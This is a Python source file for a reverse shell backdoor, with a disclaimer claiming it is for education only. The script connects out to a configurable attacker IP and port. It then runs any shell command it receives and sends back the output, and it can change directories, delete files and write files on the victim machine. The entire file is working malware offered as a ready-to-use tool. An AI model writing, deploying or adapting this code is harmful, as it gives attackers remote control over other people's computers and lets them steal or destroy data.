
# # This script is a simple reverse shell backdoor that connects to an attacker's IP and listens for commands.
# # The attacker can execute commands on the target machine and receive the output.
# # The backdoor can also change directories using the "cd" command
# #TODO this script is only for education purposes, do not use it for malicious purposes i'm not responsible for any damage caused by this script

import os
import socket
import subprocess

# Configuration
HOST = '192.168.0.103'  # Replace with Attacker IP
PORT = 7777             # Port


def connect():
    """Establish connection to the attacker's machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None


def receive_commands(s):

    while True:
        try:
            # Receive command from the attacker
            data = s.recv(1024).decode('utf-8').strip()
            if not data:
                continue

            # Command handling
            if data.lower() == 'exit':
                s.close()
                break
            elif data.lower().startswith('cd '):
                # Change directory
                directory = data[3:].strip()
                try:
                    os.chdir(directory)
                    s.send(
                        f"Changed directory to {os.getcwd()}".encode('utf-8'))
                except Exception as e:
                    s.send(f"Error: {e}".encode('utf-8'))
            elif data.lower().startswith('delete '):
                # Delete a file
                filename = data[7:].strip()
                try:
                    os.remove(filename)
                    s.send(f"Deleted file: {filename}".encode('utf-8'))
                except Exception as e:
                    s.send(f"Error: {e}".encode('utf-8'))
            elif data.lower().startswith('create '):
                # Create a file with content
                command_parts = data[7:].split(' ', 1)
                if len(command_parts) < 2:
                    s.send("Error: Provide filename and content".encode('utf-8'))
                else:
                    filename, content = command_parts[0], command_parts[1]
                    try:
                        with open(filename, 'w') as f:
                            f.write(content)
                        s.send(f"Created file: {filename}".encode('utf-8'))
                    except Exception as e:
                        s.send(f"Error: {e}".encode('utf-8'))
            else:
                # Execute other shell commands and return output
                try:
                    output = subprocess.check_output(
                        data, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {e}".encode('utf-8'))

        except Exception as e:
            s.send(f"Error: {e}".encode('utf-8'))
            break


def main():
    """Main function to start the backdoor."""
    print("[*] Connecting")
    s = connect()
    if s:
        print("[*] Connected to the server.")
        s.send(f"Connected from {os.getcwd()}\n".encode('utf-8'))
        receive_commands(s)
    else:
        print("[*] Could not connect to the server.")


if __name__ == "__main__":
    main()
